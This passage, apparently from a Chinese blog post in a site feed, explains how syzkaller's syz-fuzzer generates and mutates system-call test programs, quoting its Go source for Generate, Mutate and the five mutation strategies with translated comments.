<span class="hljs-number">0</span> || i%generatePeriod == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Generate a new prog.</span><br>p := proc.fuzzer.target.Generate(proc.rnd, prog.RecommendedCalls, ct)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: generated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatGenerate)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Mutate an existing prog.</span><br>p := fuzzerSnapshot.chooseProgram(proc.rnd).Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, ct, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatFuzz)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-Generate-：生成一个新的输入程序"><a href="#【核心】target-Generate-：生成一个新的输入程序" class="headerlink" title="【核心】target.Generate()：生成一个新的输入程序"></a>【核心】target.Generate()：生成一个新的输入程序</h3><p>该函数本体其实比较简短，主要就是随机生成指定数量的系统调用并打包到一个新的 <code>Prog</code> 结构体当中，生成的依据主要是我们前面给出的 <code>ChoiceTable</code> 表，最后移除程序末尾多余的系统调用便直接返回了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Generate 生成一个带有 ncalls 个调用的随机程序.</span><br><span class="hljs-comment">// ct 包含一组允许的系统调用, 若为 nil 则将使用所有的系统调用.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> Generate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable) *Prog &#123;<br>p := &amp;Prog&#123;<br>Target: target,<br>&#125;<br>r := newRand(target, rs)<br>s := newState(target, ct, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &lt; ncalls &#123;<br>calls := r.generateCall(s, p, <span class="hljs-built_in">len</span>(p.Calls))<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> calls &#123;<br>s.analyze(c)<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls, c)<br>&#125;<br>&#125;<br><span class="hljs-comment">// 对于生成的最后一个调用而言，我们有可能在创造资源的同时增加额外的系统调用，</span><br><span class="hljs-comment">// 从而导致调用数量超过 ncalls。移除部分调用。</span><br>    <span class="hljs-comment">/* 译注：例如 read 需要一个 fd，那可能前面会再补一个 open */</span><br><span class="hljs-comment">// 在最后的调用中的资源会被替换为默认值,这便是我们所想要的。</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ncalls &#123;<br>p.RemoveCall(ncalls - <span class="hljs-number">1</span>)<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成单个系统调用的核心函数是 <code>generateCall()</code>：</p><ul><li>首先会检查 <code>insertPoint</code> 是否不为 0（为 0 则说明刚开始生成第一个系统调用），若是则随机选取程序中已有的一个调用，若其未设置 <code>NoGenerate</code> 属性则将其 id （系统调用号）作为 <code>biasCall</code>，即<strong>生成的第一个系统调用完全随机，后续系统调用则根据优先级表进行生成</strong></li><li>接下来调用 ChoiceTable 的 <code>choose</code> 方法，对于第一个系统调用而言其会从 ChoiceTable 中随机选取一个系统调用作为 <code>biasCall</code>，接下来从优先级表中选取 <code>biasCall</code> 对应的优先级数据，从中随机选取一个范围中优先级最高的一个返回</li><li>最后调用 <code>generateParticularCall()</code> 生成该系统调用所要用到的数据，这里就不展开了</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ct *ChoiceTable)</span></span> choose(r *rand.Rand, bias <span class="hljs-type">int</span>) <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> bias &lt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">/* 第一个系统调用，随机选择 */</span><br>bias = ct.calls[r.Intn(<span class="hljs-built_in">len</span>(ct.calls))].ID<br>&#125;<br><span class="hljs-keyword">if</span> !ct.Generatable(bias) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;bias to disabled or non-generatable syscall %v\n&quot;</span>, ct.target.Syscalls[bias].Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled or non-generatable syscall&quot;</span>)<br>&#125;<br>run := ct.runs[bias]<br>x := <span class="hljs-type">int32</span>(r.Intn(<span class="hljs-type">int</span>(run[<span class="hljs-built_in">len</span>(run)<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>)<span class="hljs-comment">/* 选择优先级范围 */</span><br>res := sort.Search(<span class="hljs-built_in">len</span>(run), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> run[i] &gt;= x<br>&#125;)<br><span class="hljs-keyword">if</span> !ct.Generatable(res) &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;selected disabled or non-generatable syscall&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *randGen)</span></span> generateCall(s *state, p *Prog, insertionPoint <span class="hljs-type">int</span>) []*Call &#123;<br>biasCall := <span class="hljs-number">-1</span><br><span class="hljs-keyword">if</span> insertionPoint &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Choosing the base call is based on the insertion point of the new calls sequence.</span><br>insertionCall := p.Calls[r.Intn(insertionPoint)].Meta<br><span class="hljs-keyword">if</span> !insertionCall.Attrs.NoGenerate &#123;<br><span class="hljs-comment">// We must be careful not to bias towards a non-generatable call.</span><br>biasCall = insertionCall.ID<br>&#125;<br>&#125;<br>idx := s.ct.choose(r.Rand, biasCall)<br>meta := r.target.Syscalls[idx]<br><span class="hljs-keyword">return</span> r.generateParticularCall(s, meta)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】prog-Mutate-：变异一个输入程序"><a href="#【核心】prog-Mutate-：变异一个输入程序" class="headerlink" title="【核心】prog.Mutate()：变异一个输入程序"></a>【核心】prog.Mutate()：变异一个输入程序</h3><p>该函数的核心其实是一个<strong>随机变异</strong>的循环，这里的变量 <code>r</code> 为一个随机数生成器：</p><ul><li>生成一个 <code>[0, 5)</code> 之间的随机数，若为 0 则执行 <code>mutator.squashAny()</code> </li><li>上一条未命中，则生成一个  <code>[0, 100)</code> 间随机数，若 &gt;&#x3D; 1 则执行 <code>mutator.splice()</code></li><li>上一条未命中，则生成一个 <code> [0, 31)</code> 间随机数，若 &gt;&#x3D; 20 则执行 <code>mutator.insertCall()</code></li><li>上一条未命中，则生成一个 <code>[0, 11)</code> 间随机数，若 &gt;&#x3D; 10 则执行 <code>mutateArg()</code></li><li>皆未命中，执行 <code>mutator.removeCall()</code></li></ul><p>终止循环的条件是 <code>上述变异操作之一成功执行 &amp; 系统调用数不为 0</code> ，此外还有 2&#x2F;3 的概率重新进入循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Mutate program p.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// p:           要变异的程序.</span><br><span class="hljs-comment">// rs:          随机数资源池.</span><br><span class="hljs-comment">// ncalls:      变异后程序中允许的最大调用数量.</span><br><span class="hljs-comment">// ct:          系统调用的 ChoiceTable.</span><br><span class="hljs-comment">// noMutate:    一组不该被变异的系统调用的 ID 集合.</span><br><span class="hljs-comment">// corpus:      包括原始程序 p 的整个语料库.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> Mutate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable, noMutate <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>, corpus []*Prog) &#123;<br>r := newRand(p.Target, rs)<br><span class="hljs-keyword">if</span> ncalls &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>ncalls = <span class="hljs-built_in">len</span>(p.Calls)<br>&#125;<br>ctx := &amp;mutator&#123;<br>p:        p,<br>r:        r,<br>ncalls:   ncalls,<br>ct:       ct,<br>noMutate: noMutate,<br>corpus:   corpus,<br>&#125;<br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; <span class="hljs-built_in">len</span>(p.Calls) != <span class="hljs-number">0</span> &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> r.oneOf(<span class="hljs-number">5</span>):<br><span class="hljs-comment">// Not all calls have anything squashable,</span><br><span class="hljs-comment">// so this has lower priority in reality.</span><br>ok = ctx.squashAny()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>ok = ctx.splice()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">20</span>, <span class="hljs-number">31</span>):<br>ok = ctx.insertCall()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">10</span>, <span class="hljs-number">11</span>):<br>ok = ctx.mutateArg()<br><span class="hljs-keyword">default</span>:<br>ok = ctx.removeCall()<br>&#125;<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">if</span> got := <span class="hljs-built_in">len</span>(p.Calls); got &lt; <span class="hljs-number">1</span> || got &gt; ncalls &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad number of calls after mutation: %v, want [1, %v]&quot;</span>, got, ncalls))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看这五个不同的变异方案</p><h4 id="mutator-squashAny-：随机变异一个系统调用的参数"><a href="#mutator-squashAny-：随机变异一个系统调用的参数" class="headerlink" title="mutator.squashAny()：随机变异一个系统调用的参数"></a>mutator.squashAny()：随机变异一个系统调用的参数</h4><p>该函数一开始会调用 <code>Prog.complexPtr()</code>，其中主要会调用 <code>ForEachArg()</code> 遍历用例程序的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 选择一个随机的复杂指针并将其参数变为 ANY.</span><br><span class="hljs-comment">// 之后，若 ANY 中包含有 blob，变异一个随机的 blob.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> squashAny() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br>complexPtrs := p.complexPtrs()<br></code></pre></td></tr></table></figure><p>传入给 <code>ForEachArg()</code> 的回调函数主要调用 <code>isComplexPtr()</code> 判断每个调用的参数中是否存在复杂指针（多级指针），若是，则将该调用添加到作为返回值的数组中，<strong>即这个函数其实主要是针对多级指针的变异</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> complexPtrs() (res []complexPtr) &#123;<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> p.Calls &#123;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> ptrArg, ok := arg.(*PointerArg); ok &amp;&amp; p.Target.isComplexPtr(ptrArg) &#123;<br>res = <span class="hljs-built_in">append</span>(res, complexPtr&#123;ptrArg, c&#125;)<br>ctx.Stop = <span class="hljs-literal">true</span><br>&#125;<br>&#125;)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会从返回列表中随机选择一个指针，若其对应的调用不允许变异则直接返回，若非指针则调用 <code>squashPtr()</code> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">ptr := complexPtrs[r.Intn(<span class="hljs-built_in">len</span>(complexPtrs))]<br><span class="hljs-keyword">if</span> ctx.noMutate[ptr.call.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> !p.Target.isAnyPtr(ptr.arg.Type()) &#123;<br>p.Target.squashPtr(ptr.arg)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>ForEachSubArg()</code>（本质上为 <code>ForEachArgImpl()</code> 的封装），对之前随机选取的系统调用的参数进行遍历，这里传入的回调函数主要是检查 <code>arg.Dir()</code> 是否为 <code>DirOut</code>，若没有一个参数符合则直接返回 <code>false</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> blobs []*DataArg<br><span class="hljs-keyword">var</span> bases []*PointerArg<br>ForeachSubArg(ptr.arg, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> data, ok := arg.(*DataArg); ok &amp;&amp; arg.Dir() != DirOut &#123;<br>blobs = <span class="hljs-built_in">append</span>(blobs, data)<br>bases = <span class="hljs-built_in">append</span>(bases, ctx.Base)<br>&#125;<br>&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blobs) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>最后一部分主要是调用 <code>analyze()</code> 进行分析，之后调用 <code>mutateData()</code> 来对参数的数据进行变异，以及对指针的更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 注意: 我们需要在变异之前调用 analyze.</span><br><span class="hljs-comment">// 在变异后其可以增长到超过数据区域的范围，</span><br><span class="hljs-comment">// 在标记现有分配时 analyze 将为 OOB 访问崩溃.</span><br>s := analyze(ctx.ct, ctx.corpus, p, ptr.call)<br><span class="hljs-comment">// TODO(dvyukov): 我们可能想要为 ANY 弄一个特别的变异.</span><br><span class="hljs-comment">// 例如，合并相邻的 ANYBLOBs (我们并不创造他们,</span><br><span class="hljs-comment">// 但他们能在将来出现); 或是用一个 blob 替代 ANYRES</span><br><span class="hljs-comment">// (并使用相邻的 blobs 将其合并).</span><br>idx := r.Intn(<span class="hljs-built_in">len</span>(blobs))<br>arg := blobs[idx]<br>base := bases[idx]<br>baseSize := base.Res.Size()<br>arg.data = mutateData(r, arg.Data(), <span class="hljs-number">0</span>, maxBlobLen)<br><span class="hljs-comment">// 若 size 变大了则更新基指针.</span><br><span class="hljs-keyword">if</span> baseSize &lt; base.Res.Size() &#123;<br>newArg := r.allocAddr(s, base.Type(), base.Dir(), base.Res.Size(), base.Res)<br>*base = *newArg<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中"><a href="#mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中" class="headerlink" title="mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中"></a>mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中</h4><p>该函数为编译过程当中概率最大的主分支，不过其逻辑比较简短：</p><ul><li>首先从语料库中随机复制一个程序</li><li>选择一个随机下标 <code>idx</code> ，在待变异程序该下标处插入 <code>p0</code> 的系统调用组</li><li>从末尾移除多余的调用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 译注：注释写得比较抽象这里就不贴了：）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> splice() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ctx.corpus) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>p0 := ctx.corpus[r.Intn(<span class="hljs-built_in">len</span>(ctx.corpus))]<br>p0c := p0.Clone()<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls[:idx], <span class="hljs-built_in">append</span>(p0c.Calls, p.Calls[idx:]...)...)<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(p.Calls) - <span class="hljs-number">1</span>; i &gt;= ctx.ncalls; i-- &#123;<br>p.RemoveCall(i)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置"><a href="#mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置" class="headerlink" title="mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置"></a>mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置</h4><p>该函数的逻辑也比较简短，若程序中调用数量已经达到 <code>ncalls</code> 的限制则直接返回，否则会先调用 <code>analyze()</code> 进行分析，随后调用 <code>generateCall()</code> 生成一个系统调用并插入到程序中的一个随机位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 在一个随机点（倾向于现有程序的末尾）插入一个随机调用</span><br><span class="hljs-comment">// 若该程序调用数量早已达到 ncalls（译注：限制数量）则不会插入）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> insertCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.biasedRand(<span class="hljs-built_in">len</span>(p.Calls)+<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">var</span> c *Call<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>c = p.Calls[idx]<br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>calls := r.generateCall(s, p, idx)<br>p.insertBefore(c, calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-mutateArg-：随机变异程序中某一系统调用的参数"><a href="#mutator-mutateArg-：随机变异程序中某一系统调用的参数" class="headerlink" title="mutator.mutateArg()：随机变异程序中某一系统调用的参数"></a>mutator.mutateArg()：随机变异程序中某一系统调用的参数</h4><p>该函数的主要作用便是随机变异程序中某一系统调用的参数，这里就不深入展开分析了，感兴趣可以直接看源码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> mutateArg() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br>idx := chooseCall(p, r)<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>c := p.Calls[idx]<br><span class="hljs-keyword">if</span> ctx.noMutate[c.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>updateSizes := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br>ok = <span class="hljs-literal">true</span><br>ma := &amp;mutationArgs&#123;target: p.Target&#125;<br>ForeachArg(c, ma.collectArg)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ma.args) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>arg, argCtx := ma.chooseArg(r.Rand)<br>calls, ok1 := p.Target.mutateArg(r, s, arg, argCtx, &amp;updateSizes)<br><span class="hljs-keyword">if</span> !ok1 &#123;<br>ok = <span class="hljs-literal">false</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>p.insertBefore(c, calls)<br>idx += <span class="hljs-built_in">len</span>(calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>idx--<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-built_in">len</span>(p.Calls) || p.Calls[idx] != c &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;wrong call index: idx=%v calls=%v p.Calls=%v ncalls=%v&quot;</span>,<br>idx, <span class="hljs-built_in">len</span>(calls), <span class="hljs-built_in">len</span>(p.Calls), ctx.ncalls))<br>&#125;<br><span class="hljs-keyword">if</span> updateSizes &#123;<br>p.Target.assignSizesCall(c)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-removeCall-：随机移除程序中的一个系统调用"><a href="#mutator-removeCall-：随机移除程序中的一个系统调用" class="headerlink" title="mutator.removeCall()：随机移除程序中的一个系统调用"></a>mutator.removeCall()：随机移除程序中的一个系统调用</h4><p>该函数也比较简短，主要就是随机移除程序中的一个系统调用，如果程序中没有系统调用则不会进行移除操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> removeCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.RemoveCall(idx)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>至此，syz-fuzzer 主体源码逻辑分析完毕</p><blockquote><p>简单总结的话，笔者感觉其实主要都是偏工程性的东西比较多🤔</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;（摘下眼镜）Furry？（戴上眼镜）Fuzzer！&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
